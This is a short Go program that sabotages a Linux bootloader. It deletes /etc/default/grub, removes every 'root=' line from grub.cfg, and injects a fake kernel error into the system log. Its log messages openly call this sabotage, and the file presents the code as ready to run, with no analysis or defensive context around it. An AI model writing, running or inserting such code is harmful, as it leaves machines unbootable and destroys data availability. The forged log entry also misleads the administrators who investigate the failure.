package main

import (
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"strings"
)

func main() {
	grubPath := findGrubCfg()
	if grubPath == "" {
		log.Fatal("No grub.cfg found!")
	}

	log.Println("Sabotaging GRUB at:", grubPath)

	// Delete /etc/default/grub
	err := os.Remove("/etc/default/grub")
	if err != nil && !os.IsNotExist(err) {
		log.Printf("Failed to delete /etc/default/grub: %v", err)
	}

	// Remove all 'root=' lines from grub.cfg
	err = removeRootLines(grubPath)
	if err != nil {
		log.Fatalf("Failed to edit grub.cfg: %v", err)
	}

	// Inject kernel error into logs
	cmd := exec.Command("logger", "-p", "err", "Simulated kernel error: This is a test error for demonstration")
	err = cmd.Run()
	if err != nil {
		log.Printf("Failed to inject fake kernel error: %v", err)
	}

	log.Println("Bootloader sabotage complete.")
}

func findGrubCfg() string {
	possiblePaths := []string{"/boot/grub2/grub.cfg", "/boot/grub/grub.cfg"}

	for _, path := range possiblePaths {
		if _, err := os.Stat(path); err == nil {
			return path
		}
	}
	return ""
}

func removeRootLines(filepath string) error {
	data, err := ioutil.ReadFile(filepath)
	if err != nil {
		return err
	}

	lines := strings.Split(string(data), "\n")
	var newLines []string

	for _, line := range lines {
		if !strings.Contains(line, "root=") {
			newLines = append(newLines, line)
		}
	}

	newContent := strings.Join(newLines, "\n")
	return ioutil.WriteFile(filepath, []byte(newContent), 0644)
}
